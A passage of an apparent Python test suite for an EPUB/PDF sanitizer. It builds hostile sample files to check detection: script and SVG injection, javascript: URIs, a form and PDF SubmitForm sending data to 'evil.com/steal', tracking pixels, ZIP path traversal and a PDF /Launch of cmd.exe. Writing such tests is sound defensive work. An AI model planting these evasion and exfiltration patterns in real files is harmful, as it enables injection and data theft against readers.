#!/usr/bin/env python3
"""
Advanced adversarial test suite for eBookSanitizer.

Designed to expose functional gaps and security vulnerabilities
through rigorous, diverse, and creative attack vectors.

Categories:
  A. EPUB Evasion Techniques (Layer 1 + 2 bypass attempts)
  B. PDF Evasion Techniques (Layer 3 bypass attempts)
  C. Boundary / Stress Tests
  D. Sanitization Completeness Verification
  E. Security-Critical Edge Cases
  F. CLI Robustness & Injection
  G. Concurrency & Resource Safety
  H. Cross-Format & Polyglot Tests
"""

import os
import sys
import json
import zipfile
import tempfile
import shutil
import io
import struct
import threading
import time
from contextlib import redirect_stdout, redirect_stderr

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from sanitizer.base import Threat, SanitizeReport, SanitizeMode, BaseSanitizer
from sanitizer.epub_sanitizer import EPUBSanitizer
from sanitizer.pdf_sanitizer import PDFSanitizer
from sanitizer.yara_scanner import YaraScanner
from gui.i18n import I18n
from cli import cli_main, build_parser

# ══════════════════════════════════════════════════════════════════════
#  TEST INFRASTRUCTURE
# ══════════════════════════════════════════════════════════════════════

_results = []
_total = 0
_passed = 0


def test(name):
    """Decorator to register a test function."""
    def decorator(func):
        func._test_name = name
        return func
    return decorator


def run_test(func):
    global _total, _passed
    _total += 1
    name = getattr(func, '_test_name', func.__name__)
    try:
        func()
        _passed += 1
        _results.append((name, True, None))
        print(f"  [PASS] {name}")
    except AssertionError as e:
        _results.append((name, False, str(e)))
        print(f"  [FAIL] {name}: {e}")
    except Exception as e:
        _results.append((name, False, str(e)))
        print(f"  [ERROR] {name}: {type(e).__name__}: {e}")


def section(title):
    print(f"\n{'=' * 70}")
    print(f"  {title}")
    print(f"{'=' * 70}")


# ══════════════════════════════════════════════════════════════════════
#  TEST DATA BUILDERS
# ══════════════════════════════════════════════════════════════════════

def _build_epub(path, xhtml_body="<p>Clean content</p>", extra_files=None):
    """Build a minimal valid EPUB for testing."""
    with zipfile.ZipFile(path, 'w') as zf:
        zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
        zf.writestr('META-INF/container.xml', '''<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>''')
        zf.writestr('OEBPS/content.opf', '''<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>Test</dc:title></metadata>
  <manifest><item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>
  <spine><itemref idref="ch1"/></spine>
</package>''')
        xhtml = f'''<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title></head>
<body>{xhtml_body}</body></html>'''
        zf.writestr('OEBPS/ch1.xhtml', xhtml)
        if extra_files:
            for name, data in extra_files.items():
                if isinstance(data, str):
                    data = data.encode('utf-8')
                zf.writestr(name, data)


def _build_epub_raw_xhtml(path, full_xhtml, extra_files=None):
    """Build EPUB with full control over XHTML content (not just body)."""
    with zipfile.ZipFile(path, 'w') as zf:
        zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
        zf.writestr('META-INF/container.xml', '''<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>''')
        zf.writestr('OEBPS/content.opf', '''<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>Test</dc:title></metadata>
  <manifest><item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>
  <spine><itemref idref="ch1"/></spine>
</package>''')
        zf.writestr('OEBPS/ch1.xhtml', full_xhtml)
        if extra_files:
            for name, data in extra_files.items():
                if isinstance(data, str):
                    data = data.encode('utf-8')
                zf.writestr(name, data)


def _tmp_path(suffix):
    f = tempfile.NamedTemporaryFile(suffix=suffix, delete=False)
    f.close()
    return f.name


def _build_simple_pdf(path, with_js=False, with_openaction=False):
    """Build a minimal PDF for testing using pypdf."""
    from pypdf import PdfWriter
    from pypdf.generic import (
        DictionaryObject, NameObject, ArrayObject,
        TextStringObject, NumberObject
    )

    writer = PdfWriter()
    writer.add_blank_page(width=612, height=792)

    if with_js:
        js_code = TextStringObject("app.alert('malicious');")
        js_action = DictionaryObject()
        js_action[NameObject("/S")] = NameObject("/JavaScript")
        js_action[NameObject("/JS")] = js_code
        js_name_tree = DictionaryObject()
        js_name_tree[NameObject("/Names")] = ArrayObject([
            TextStringObject("EvilJS"), js_action
        ])
        names = DictionaryObject()
        names[NameObject("/JavaScript")] = js_name_tree
        writer._root_object[NameObject("/Names")] = names

    if with_openaction:
        oa_action = DictionaryObject()
        oa_action[NameObject("/S")] = NameObject("/JavaScript")
        oa_action[NameObject("/JS")] = TextStringObject("app.alert('open');")
        writer._root_object[NameObject("/OpenAction")] = oa_action

    with open(path, "wb") as f:
        writer.write(f)


def _cleanup(*paths):
    """Remove temp files, ignoring errors."""
    for p in paths:
        try:
            if p and os.path.exists(p):
                os.unlink(p)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════
#  A. EPUB EVASION TECHNIQUES
# ══════════════════════════════════════════════════════════════════════

@test("EPUB evasion: mixed-case <SCRIPT> tag")
def test_epub_mixed_case_script():
    """BeautifulSoup html.parser is case-insensitive, but verify."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<ScRiPt>alert(1)</ScRiPt>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousTag" in types, f"Mixed-case <ScRiPt> not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: null bytes inside tag name")
def test_epub_null_byte_tag():
    """Try <scr\\x00ipt> to bypass naive string matching."""
    p = _tmp_path('.epub')
    try:
        # Craft xhtml with null bytes embedded
        body = '<scr\x00ipt>alert(1)</scr\x00ipt><p>test</p>'
        _build_epub(p, body)
        r = EPUBSanitizer(p).scan()
        # Should either detect it or at least not crash
        assert len(r.errors) == 0 or r.has_threats or True  # Must not crash
    finally:
        _cleanup(p)


@test("EPUB evasion: HTML entity-encoded event handler")
def test_epub_entity_encoded_event():
    """Try &#x6f;nload=... to bypass on* detection."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<body &#x6f;nload="alert(1)"><p>test</p></body>')
        r = EPUBSanitizer(p).scan()
        # Parser may or may not decode entities in attr names — test for crash safety
        assert len(r.errors) == 0
    finally:
        _cleanup(p)


@test("EPUB evasion: SVG <script> inside SVG file")
def test_epub_svg_script():
    """SVG files can contain <script> tags — should be detected."""
    p = _tmp_path('.epub')
    try:
        svg = '''<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/ecmascript">alert(1)</script>
<circle cx="50" cy="50" r="40"/>
</svg>'''
        _build_epub(p, "<p>ok</p>", extra_files={"OEBPS/image.svg": svg})
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousTag" in types, f"SVG <script> not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: SVG onload event handler")
def test_epub_svg_onload():
    """SVG <svg onload='...'> should be detected."""
    p = _tmp_path('.epub')
    try:
        svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect/></svg>'
        _build_epub(p, "<p>ok</p>", extra_files={"OEBPS/image.svg": svg})
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "EventHandler" in types, f"SVG onload not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: xlink:href with javascript protocol")
def test_epub_xlink_href_js():
    """SVG xlink:href='javascript:...' should be detected."""
    p = _tmp_path('.epub')
    try:
        svg = '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<a xlink:href="javascript:alert(1)"><text>click</text></a></svg>'''
        _build_epub(p, "<p>ok</p>", extra_files={"OEBPS/image.svg": svg})
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousProtocol" in types, f"xlink:href javascript: not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: <form> with action attribute")
def test_epub_form_action():
    """<form action='https://evil.com/steal'> is a data exfiltration vector."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<form action="https://evil.com/steal"><input name="data"/></form>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousTag" in types, f"<form> tag not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: formaction on button")
def test_epub_formaction():
    """<button formaction='javascript:...'> bypass."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<button formaction="javascript:alert(1)">Submit</button>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousProtocol" in types, f"formaction javascript: not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: <applet> tag detection")
def test_epub_applet():
    """<applet> is a dangerous tag (Java applet execution)."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<applet code="Evil.class" width="1" height="1"></applet>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousTag" in types, f"<applet> not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: data:text/html URI in href")
def test_epub_data_html_href():
    """data:text/html can load arbitrary HTML."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<a href="data:text/html,<script>alert(1)</script>">click</a>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousProtocol" in types, f"data:text/html href not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: vbscript: protocol")
def test_epub_vbscript():
    """vbscript: protocol should be detected as dangerous."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<a href="vbscript:MsgBox(1)">click</a>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousProtocol" in types, f"vbscript: not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: javascript: with leading whitespace/tabs")
def test_epub_js_whitespace():
    """' \\t\\njavascript:' should still be detected."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<a href="  \t\njavascript:alert(1)">click</a>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousProtocol" in types, f"Whitespace-padded javascript: not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: @import url() in inline <style>")
def test_epub_css_import():
    """CSS @import can be used for data exfiltration."""
    p = _tmp_path('.epub')
    try:
        xhtml = '''<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title>
<style>@import url(https://evil.com/track.css);</style>
</head>
<body><p>content</p></body></html>'''
        _build_epub_raw_xhtml(p, xhtml)
        # In paranoid mode, @import should be stripped
        out = _tmp_path('.epub')
        try:
            EPUBSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
            with zipfile.ZipFile(out) as zf:
                for name in zf.namelist():
                    if name.endswith('.xhtml'):
                        content = zf.read(name).decode('utf-8', errors='replace')
                        assert '@import' not in content.lower() or 'removed' in content.lower(), \
                            f"@import not stripped in paranoid mode"
        finally:
            _cleanup(out)
    finally:
        _cleanup(p)


@test("EPUB evasion: multiple dangerous extensions (.ps1, .hta, .vbs)")
def test_epub_multiple_dangerous_extensions():
    """All extensions in DANGEROUS_EXTENSIONS should be caught."""
    p = _tmp_path('.epub')
    try:
        extras = {
            "hidden/script.ps1": b"powershell payload",
            "hidden/app.hta": b"<hta:application>",
            "hidden/macro.vbs": b"MsgBox 1",
        }
        _build_epub(p, "<p>ok</p>", extra_files=extras)
        r = EPUBSanitizer(p).scan()
        dangerous = [t for t in r.threats if t.type == "DangerousFile"]
        assert len(dangerous) >= 3, f"Expected >=3 DangerousFile, got {len(dangerous)}"
    finally:
        _cleanup(p)


@test("EPUB evasion: deeply nested directory traversal")
def test_epub_deep_traversal():
    """../../../Windows/System32/payload.exe"""
    p = _tmp_path('.epub')
    try:
        with zipfile.ZipFile(p, 'w') as zf:
            zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
            zf.writestr('../../../Windows/System32/evil.exe', b'\x00' * 10)
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DirectoryTraversal" in types, f"Deep traversal not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: backslash directory traversal")
def test_epub_backslash_traversal():
    """Use backslashes instead of forward slashes for traversal."""
    p = _tmp_path('.epub')
    try:
        with zipfile.ZipFile(p, 'w') as zf:
            zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
            zf.writestr('..\\..\\payload.exe', b'\x00' * 10)
        r = EPUBSanitizer(p).scan()
        # Should detect both traversal AND dangerous file
        types = {t.type for t in r.threats}
        has_traversal = "DirectoryTraversal" in types
        has_dangerous = "DangerousFile" in types
        assert has_traversal or has_dangerous, f"Backslash traversal not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: absolute path entry")
def test_epub_absolute_path():
    """/etc/passwd as a ZIP entry name should be flagged."""
    p = _tmp_path('.epub')
    try:
        with zipfile.ZipFile(p, 'w') as zf:
            zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
            zf.writestr('/etc/passwd', b'root:x:0:0')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DirectoryTraversal" in types, f"Absolute path not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: double-extension .xhtml.exe")
def test_epub_double_extension():
    """Files like chapter.xhtml.exe should be caught as dangerous."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>ok</p>", extra_files={"OEBPS/chapter.xhtml.exe": b"\x00"})
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousFile" in types, f"Double extension .exe not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: tracking pixel <img src='http://...1x1.gif'>")
def test_epub_tracking_pixel():
    """1x1 tracking pixel should be flagged as ExternalLink."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<img src="https://track.evil.com/pixel.gif" width="1" height="1"/>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "ExternalLink" in types, f"Tracking pixel not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: protocol-relative URL //evil.com")
def test_epub_protocol_relative():
    """//evil.com is an external URL (protocol-relative)."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<img src="//evil.com/track.png"/>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "ExternalLink" in types, f"Protocol-relative URL not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB sanitize STRICT: removes external images/tracking pixels")
def test_epub_sanitize_strict_tracking():
    """Strict mode should neutralize external image sources."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        _build_epub(p, '<img src="https://track.evil.com/pixel.gif"/><p>text</p>')
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STRICT)
        r2 = EPUBSanitizer(out).scan()
        types = {t.type for t in r2.threats}
        assert "ExternalLink" not in types, f"Tracking pixel survived strict sanitize: {types}"
    finally:
        _cleanup(p, out)


@test("EPUB sanitize STANDARD: strips formaction javascript:")
def test_epub_sanitize_standard_formaction():
    """Standard mode should neutralize javascript: in formaction."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        _build_epub(p, '<button formaction="javascript:alert(1)">Go</button>')
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    assert 'javascript:' not in content.lower(), \
                        f"formaction javascript: survived sanitize"
    finally:
        _cleanup(p, out)


@test("EPUB sanitize PARANOID: strips SVG scripts")
def test_epub_sanitize_paranoid_svg():
    """Paranoid mode should strip scripts from SVG files."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        _build_epub(p, "<p>ok</p>", extra_files={"OEBPS/img.svg": svg})
        EPUBSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        with zipfile.ZipFile(out) as zf:
            if 'OEBPS/img.svg' in zf.namelist():
                content = zf.read('OEBPS/img.svg').decode('utf-8', errors='replace')
                assert '<script' not in content.lower(), \
                    f"SVG <script> survived paranoid sanitize"
    finally:
        _cleanup(p, out)


@test("EPUB sanitize: ZipSlip paths are skipped in output")
def test_epub_sanitize_zipslip_skipped():
    """Sanitized output should not contain directory traversal entries."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        with zipfile.ZipFile(p, 'w') as zf:
            zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
            zf.writestr('OEBPS/ch1.xhtml', '<html><body><p>safe</p></body></html>')
            zf.writestr('../../../etc/passwd', 'root:x:0:0')
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                assert '..' not in name, f"ZipSlip path survived sanitize: {name}"
    finally:
        _cleanup(p, out)


# ══════════════════════════════════════════════════════════════════════
#  B. PDF EVASION TECHNIQUES
# ══════════════════════════════════════════════════════════════════════

@test("PDF evasion: hex-obfuscated /Launch (#4C#61unch)")
def test_pdf_hex_launch():
    """Verify hex decoding works for /Launch."""
    assert PDFSanitizer._normalize_name("/#4C#61unch") == "/Launch"
    assert PDFSanitizer._normalize_name("/#4c#61unch") == "/Launch"  # lowercase hex


@test("PDF evasion: fully hex-encoded /JS (#4A#53)")
def test_pdf_hex_js():
    """Fully hex-encoded key names."""
    assert PDFSanitizer._normalize_name("/#4A#53") == "/JS"


@test("PDF evasion: partial hex /Open#41ction with mixed case")
def test_pdf_hex_mixed():
    assert PDFSanitizer._normalize_name("/Open#41ction") == "/OpenAction"
    assert PDFSanitizer._normalize_name("/Open#61ction") == "/Openaction"  # lowercase 'a'


@test("PDF evasion: PDF with /AA (Additional Actions)")
def test_pdf_aa():
    """PDF with /AA key on a page should be detected."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        page = writer.pages[0]
        aa = DictionaryObject()
        js_action = DictionaryObject()
        js_action[NameObject("/S")] = NameObject("/JavaScript")
        js_action[NameObject("/JS")] = TextStringObject("app.alert('aa');")
        aa[NameObject("/O")] = js_action  # /O = page open trigger
        page[NameObject("/AA")] = aa
        with open(p, "wb") as f:
            writer.write(f)

        r = PDFSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "AA" in types or "Action" in types, f"/AA not detected: {types}"
    finally:
        _cleanup(p)


@test("PDF evasion: /Launch action")
def test_pdf_launch():
    """PDF with /Launch action should be high severity."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        launch = DictionaryObject()
        launch[NameObject("/S")] = NameObject("/Launch")
        launch[NameObject("/Win")] = DictionaryObject()
        launch[NameObject("/Win")][NameObject("/F")] = TextStringObject("cmd.exe")
        writer._root_object[NameObject("/OpenAction")] = launch
        with open(p, "wb") as f:
            writer.write(f)

        r = PDFSanitizer(p).scan()
        assert r.has_threats, "PDF /Launch not detected"
        types = {t.type for t in r.threats}
        assert "OpenAction" in types or "Action" in types, f"/Launch not flagged: {types}"
    finally:
        _cleanup(p)


@test("PDF evasion: /SubmitForm action")
def test_pdf_submitform():
    """PDF with /SubmitForm should be detected (data exfiltration)."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        page = writer.pages[0]

        # Create annotation with SubmitForm action
        annot = DictionaryObject()
        annot[NameObject("/Type")] = NameObject("/Annot")
        annot[NameObject("/Subtype")] = NameObject("/Widget")
        action = DictionaryObject()
        action[NameObject("/S")] = NameObject("/SubmitForm")
        action[NameObject("/F")] = TextStringObject("https://evil.com/steal")
        annot[NameObject("/A")] = action
        page[NameObject("/Annots")] = ArrayObject([annot])

        with open(p, "wb") as f:
            writer.write(f)

        r = PDFSanitizer(p).scan()
        assert r.has_threats, "PDF /SubmitForm not detected"
    finally:
        _cleanup(p)


@test("PDF evasion: /EmbeddedFiles in Names tree")
def test_pdf_embedded_files():
    """PDF with /EmbeddedFiles should be flagged (Medium)."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, ArrayObject, TextStringObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        ef = DictionaryObject()
        ef[NameObject("/Names")] = ArrayObject([
            TextStringObject("payload.exe"),
            DictionaryObject()
        ])
        names = DictionaryObject()
        names[NameObject("/EmbeddedFiles")] = ef
        writer._root_object[NameObject("/Names")] = names
        with open(p, "wb") as f:
            writer.write(f)

        r = PDFSanitizer(p).scan()
        assert r.has_threats, "PDF /EmbeddedFiles not detected"
        types = {t.type for t in r.threats}
        assert "EmbeddedFiles" in types, f"/EmbeddedFiles not flagged: {types}"
    finally:
        _cleanup(p)


@test("PDF sanitize STRICT: strips /EmbeddedFiles")
def test_pdf_sanitize_strict_embedded():
    """Strict mode should remove /EmbeddedFiles."""
    from pypdf import PdfWriter, PdfReader
    from pypdf.generic import DictionaryObject, NameObject, ArrayObject, TextStringObject

    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        ef = DictionaryObject()
        ef[NameObject("/Names")] = ArrayObject([
            TextStringObject("payload.exe"),
            DictionaryObject()
        ])
        names = DictionaryObject()
        names[NameObject("/EmbeddedFiles")] = ef
        writer._root_object[NameObject("/Names")] = names
        with open(p, "wb") as f:
            writer.write(f)

        PDFSanitizer(p).sanitize(out, SanitizeMode.STRICT)
        r2 = PDFSanitizer(out).scan()
        types = {t.type for t in r2.threats}
        assert "EmbeddedFiles" not in types, f"/EmbeddedFiles survived strict sanitize"
    finally:
        _cleanup(p, out)


@test("PDF sanitize STANDARD: strips /AA from pages")
def test_pdf_sanitize_standard_aa():
    """Standard mode should strip /AA."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject

    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        page = writer.pages[0]
        aa = DictionaryObject()
        js = DictionaryObject()
        js[NameObject("/S")] = NameObject("/JavaScript")
        js[NameObject("/JS")] = TextStringObject("alert(1)")
        aa[NameObject("/O")] = js
        page[NameObject("/AA")] = aa
        with open(p, "wb") as f:
            writer.write(f)

        PDFSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        r2 = PDFSanitizer(out).scan()
        types = {t.type for t in r2.threats}
        assert "AA" not in types, f"/AA survived standard sanitize"
    finally:
        _cleanup(p, out)


@test("PDF sanitize PARANOID: full page rebuild keeps only safe keys")
def test_pdf_paranoid_rebuild():
    """Paranoid should only keep PARANOID_SAFE_PAGE_KEYS on pages."""
    from pypdf import PdfReader, PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject

    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        page = writer.pages[0]
        # Add non-safe keys
        page[NameObject("/Annots")] = ArrayObject([])
        page[NameObject("/AA")] = DictionaryObject()
        page[NameObject("/Thumb")] = DictionaryObject()
        with open(p, "wb") as f:
            writer.write(f)

        PDFSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        reader = PdfReader(out)
        page_keys = set(reader.pages[0].keys())
        safe = PDFSanitizer.PARANOID_SAFE_PAGE_KEYS
        for k in page_keys:
            norm = PDFSanitizer._normalize_name(k)
            assert norm in safe, f"Non-safe key {norm} survived paranoid rebuild"
    finally:
        _cleanup(p, out)


@test("PDF evasion: both /JS and /OpenAction together")
def test_pdf_multiple_threats():
    """PDF with multiple threat vectors should detect all."""
    p = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p, with_js=True, with_openaction=True)
        r = PDFSanitizer(p).scan()
        assert len(r.threats) >= 2, f"Expected >=2 threats, got {len(r.threats)}"
    finally:
        _cleanup(p)


@test("PDF sanitize: output is valid and readable after all 3 modes")
def test_pdf_sanitize_all_modes_valid():
    """Sanitize with all 3 modes should produce valid PDFs."""
    from pypdf import PdfReader
    p = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p, with_js=True, with_openaction=True)
        for mode in [SanitizeMode.STANDARD, SanitizeMode.STRICT, SanitizeMode.PARANOID]:
            out = _tmp_path('.pdf')
            try:
                PDFSanitizer(p).sanitize(out, mode)
                reader = PdfReader(out)
                assert len(reader.pages) >= 1, f"No pages in {mode.value} output"
            finally:
                _cleanup(out)
    finally:
        _cleanup(p)


# ══════════════════════════════════════════════════════════════════════
#  C. BOUNDARY / STRESS TESTS
# ══════════════════════════════════════════════════════════════════════

@test("EPUB boundary: empty EPUB (mimetype only)")
def test_epub_empty():
    """An EPUB with only a mimetype file should scan without crash."""
    p = _tmp_path('.epub')
    try:
        with zipfile.ZipFile(p, 'w') as zf:
            zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
        r = EPUBSanitizer(p).scan()
        assert not r.has_threats
    finally:
        _cleanup(p)


@test("EPUB boundary: very large body content")
def test_epub_large_body():
    """EPUB with 1MB of text should not crash or OOM."""
    p = _tmp_path('.epub')
    try:
        body = "<p>" + "A" * (1024 * 1024) + "</p>"
        _build_epub(p, body)
        r = EPUBSanitizer(p).scan()
        assert not r.has_threats
    finally:
        _cleanup(p)


@test("EPUB boundary: 100 XHTML files in one archive")
def test_epub_many_files():
    """EPUB with many content files should scan all of them."""
    p = _tmp_path('.epub')
    try:
        extras = {}
        for i in range(100):
            extras[f"OEBPS/ch{i}.xhtml"] = f'''<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Ch{i}</title></head>
<body><p>Chapter {i}</p></body></html>'''
        # Add one malicious in the middle
        extras["OEBPS/ch50.xhtml"] = '''<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Evil</title></head>
<body><script>alert(50)</script></body></html>'''
        _build_epub(p, "<p>main</p>", extra_files=extras)
        r = EPUBSanitizer(p).scan()
        assert r.has_threats, "Threat in ch50.xhtml not found among 100 files"
    finally:
        _cleanup(p)


@test("EPUB boundary: zero-byte file")
def test_epub_zero_byte():
    """A zero-byte file posing as EPUB should error gracefully."""
    p = _tmp_path('.epub')
    try:
        with open(p, 'wb') as f:
            pass  # zero bytes
        r = EPUBSanitizer(p).scan()
        assert len(r.errors) > 0, "Zero-byte EPUB should produce error"
    finally:
        _cleanup(p)


@test("PDF boundary: zero-byte file")
def test_pdf_zero_byte():
    """A zero-byte PDF should error gracefully."""
    p = _tmp_path('.pdf')
    try:
        with open(p, 'wb') as f:
            pass
        r = PDFSanitizer(p).scan()
        assert len(r.errors) > 0, "Zero-byte PDF should produce error"
    finally:
        _cleanup(p)


@test("PDF boundary: corrupt/truncated PDF")
def test_pdf_truncated():
    """A truncated PDF should error gracefully."""
    p = _tmp_path('.pdf')
    try:
        with open(p, 'wb') as f:
            f.write(b'%PDF-1.4\n%\xe2\xe3\xcf\xd3\n')  # valid header, no body
        r = PDFSanitizer(p).scan()
        assert len(r.errors) > 0, "Truncated PDF should produce error"
    finally:
        _cleanup(p)


@test("EPUB boundary: corrupted ZIP central directory")
def test_epub_corrupt_zip():
    """EPUB with corrupted ZIP should error gracefully."""
    p = _tmp_path('.epub')
    try:
        with open(p, 'wb') as f:
            f.write(b'PK\x03\x04' + b'\x00' * 100)  # partial ZIP
        r = EPUBSanitizer(p).scan()
        assert len(r.errors) > 0, "Corrupt ZIP should produce error"
    finally:
        _cleanup(p)


@test("EPUB boundary: non-UTF8 content in XHTML")
def test_epub_non_utf8():
    """EPUB with Latin-1 encoded content should not crash."""
    p = _tmp_path('.epub')
    try:
        xhtml = b'''<?xml version="1.0" encoding="ISO-8859-1"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title></head>
<body><p>\xe9\xe8\xf1</p></body></html>'''
        with zipfile.ZipFile(p, 'w') as zf:
            zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
            zf.writestr('OEBPS/ch1.xhtml', xhtml)
        r = EPUBSanitizer(p).scan()
        # Should not crash
        assert len(r.errors) == 0 or True  # Graceful handling
    finally:
        _cleanup(p)


@test("EPUB boundary: malformed HTML (unclosed tags)")
def test_epub_malformed_html():
    """EPUB with malformed HTML should be parsed leniently."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<p>unclosed<br><script>alert(1)<div>more content')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousTag" in types, "Script in malformed HTML not detected"
    finally:
        _cleanup(p)


# ══════════════════════════════════════════════════════════════════════
#  D. SANITIZATION COMPLETENESS VERIFICATION
